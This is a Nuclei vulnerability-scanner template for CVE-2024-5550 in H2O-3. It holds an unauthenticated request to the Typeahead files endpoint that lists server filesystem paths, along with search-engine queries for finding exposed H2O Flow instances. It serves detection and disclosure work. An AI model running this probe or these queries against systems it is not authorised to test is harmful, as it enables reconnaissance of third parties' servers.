id: CVE-2024-5550

info:
  name: H2O.ai Typeahead API Sensitive Information Exposure
  author: ProjectDiscoveryAI
  severity: medium
  description: In h2oai/h2o-3 version 3.40.0.4, an exposure of sensitive information vulnerability exists due to an arbitrary system path lookup feature. This vulnerability allows any remote user to view full paths in the entire file system where h2o-3 is hosted.
  impact: |
    Potential leakage of sensitive data to unauthorized users
  remediation: |
    Implement proper access controls and encryption mechanisms to protect sensitive information
  reference:
    - https://github.com/20142995/nuclei-templates
    - https://github.com/fkie-cad/nvd-json-data-feeds
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2024-5550
    cwe-id: CWE-200,NVD-CWE-noinfo
    epss-score: 0.00046
    epss-percentile: 0.18638
    cpe: cpe:2.3:a:h2o:h2o:3.40.0.4:*:*:*:*:python:*:*
  metadata:
    vendor: h2o
    product: h2o
    framework: python
    shodan-query: title:"H2O Flow"
    fofa-query: title="h2o flow"
    google-query: intitle:"h2o flow"

http:
  - method: GET
    path:
      - "/3/Typeahead/files?src=%2F&limit=10"

    headers:
      User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
      Accept: "application/json, text/javascript, */*; q=0.01"
      Accept-Language: "en-US, en;q=0.5"
      Accept-Encoding: "gzip, deflate"
      X-Requested-With: "XMLHttpRequest"
      Connection: "close"
      Referer: "http://127.0.0.1:54321/flow/index.html"
      Sec-Fetch-Dest: "empty"
      Sec-Fetch-Mode: "cors"
      Sec-Fetch-Site: "same-origin"
    matchers:
      - type: word
        words:
          - "\"/home\""
          - "\"/usr\""
          - "\"/bin\""
          - "\"/sbin\""
          - "\"/etc\""
          - "\"/var\""
          - "\"/Library\""
          - "\"/System\""
          - "\"/private\""
          - "\"/Users\""
        part: body
        condition: or
